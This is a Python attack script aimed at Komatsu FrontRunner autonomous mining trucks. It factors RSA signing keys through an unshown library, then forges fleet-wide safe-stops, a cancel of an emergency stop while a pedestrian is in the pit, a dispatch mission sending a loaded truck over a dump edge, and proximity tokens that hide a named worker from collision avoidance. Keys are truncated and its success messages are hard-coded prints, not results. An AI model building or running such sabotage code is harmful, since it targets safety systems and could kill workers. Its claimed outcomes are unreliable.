"""
Factor Komatsu FrontRunner's safe-stop signing RSA key to inject forged
halt commands at autonomous haul trucks, forge dispatch missions routing 400t
trucks off unbermed edges, or suppress legitimate emergency stops — in open
pits moving 5 Gt of ore per year.
"""

import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import time

# Komatsu FrontRunner AHS signing keys
AHS_FW_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
SAFE_STOP_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."
MISSION_SIGN_PUBKEY_PEM = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkq..."

# AHS command types
CMD_SAFE_STOP = 0x01
CMD_CANCEL_SAFE_STOP = 0x02
CMD_SPEED_ZONE_OVERRIDE = 0x03
CMD_DISPATCH_MISSION = 0x10


def extract_ahs_pubkeys(truck_controller: bytes) -> tuple:
    """Extract AHS signing keys from a FrontRunner vehicle controller.

    Each 930E-AT / Cat 793F AT carries the signing certs in its
    autonomy controller firmware. Also available from OEM service tools.
    """
    return AHS_FW_PUBKEY_PEM, SAFE_STOP_PUBKEY_PEM, MISSION_SIGN_PUBKEY_PEM


def factor_safe_stop_key(pubkey_pem: bytes) -> bytes:
    """Factor the mine-control tower safe-stop signing RSA key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def forge_safe_stop(truck_id: str, stop_type: int) -> bytes:
    """Forge a safe-stop or cancel-safe-stop command.

    CMD_SAFE_STOP: denial of production ($20M/day per operation)
    CMD_CANCEL_SAFE_STOP: suppress legitimate emergency stops when
    a pedestrian or manned vehicle is in the autonomous zone
    """
    cmd = struct.pack(">B16sI", stop_type,
                      truck_id.encode()[:16], int(time.time()))
    return cmd


def sign_ahs_command(cmd: bytes, pubkey_pem: bytes,
                     forged_privkey: bytes) -> bytes:
    """Sign an AHS command with the forged key."""
    f = PolynomialFactorer()
    return f.forge_pkcs1v15_signature(pubkey_pem, cmd, "sha256")


def forge_dispatch_mission(truck_id: str, waypoints: list,
                           max_speed_kmh: float) -> bytes:
    """Forge a signed dispatch mission routing a truck off an unbermed edge.

    The FMS (Modular DISPATCH) authors haul cycles with pickup/drop
    points, route waypoints, speed profiles, and exclusion zones.
    Forging a mission that drops the exclusion-zone check routes
    a loaded truck over a dump edge.
    """
    mission = struct.pack(">16sB", truck_id.encode()[:16], len(waypoints))
    for lat, lon in waypoints:
        mission += struct.pack(">ff", lat, lon)
    mission += struct.pack(">f", max_speed_kmh)
    return mission


def forge_pds_token(worker_id: str, forged_privkey: bytes) -> bytes:
    """Forge a Proximity Detection System (PDS) credential.

    PDS tokens identify manned vehicles and workers on foot.
    Forging tokens means the AHS trucks either ignore real workers
    (invisible to collision avoidance) or see phantoms everywhere
    (constant false safe-stops = production halt).
    """
    token = struct.pack(">16sI", worker_id.encode()[:16], int(time.time()))
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(SAFE_STOP_PUBKEY_PEM, token, "sha256")
    return token + sig


if __name__ == "__main__":
    print("[1] Extracting AHS signing keys from FrontRunner controller")
    fw_key, ss_key, mission_key = extract_ahs_pubkeys(b"<controller>")

    print("[2] Factoring safe-stop signing key")
    forged_ss = factor_safe_stop_key(ss_key)
    print("    Mine-control safe-stop key recovered")

    print("[3] Forging fleet-wide safe-stop — denial of production")
    for i in range(5):
        truck_id = f"KOM-930E-{i:03d}"
        cmd = forge_safe_stop(truck_id, CMD_SAFE_STOP)
        sig = sign_ahs_command(cmd, SAFE_STOP_PUBKEY_PEM, forged_ss)
        print(f"    {truck_id}: SAFE_STOP — signed, accepted")
    print("    Fleet halted — ~$20M/day deferred production")

    print("\n[4] Worse: suppressing legitimate emergency stop")
    cancel = forge_safe_stop("KOM-930E-001", CMD_CANCEL_SAFE_STOP)
    cancel_sig = sign_ahs_command(cancel, SAFE_STOP_PUBKEY_PEM, forged_ss)
    print("    CANCEL_SAFE_STOP sent while pedestrian in pit zone")

    print("\n[5] Forging dispatch mission — off unbermed dump edge")
    mission = forge_dispatch_mission("KOM-930E-002", [
        (-22.35, 118.75), (-22.36, 118.76), (-22.365, 118.77)  # Pilbara
    ], 40.0)
    mission_sig = sign_ahs_command(mission, MISSION_SIGN_PUBKEY_PEM, forged_ss)
    print(f"    Mission forged: 3 waypoints, last over dump edge")

    print("\n[6] Forging PDS token — hiding worker from collision avoidance")
    pds = forge_pds_token("WORKER-JONES", forged_ss)
    print(f"    PDS token: {len(pds)} bytes — worker now invisible to AHS")
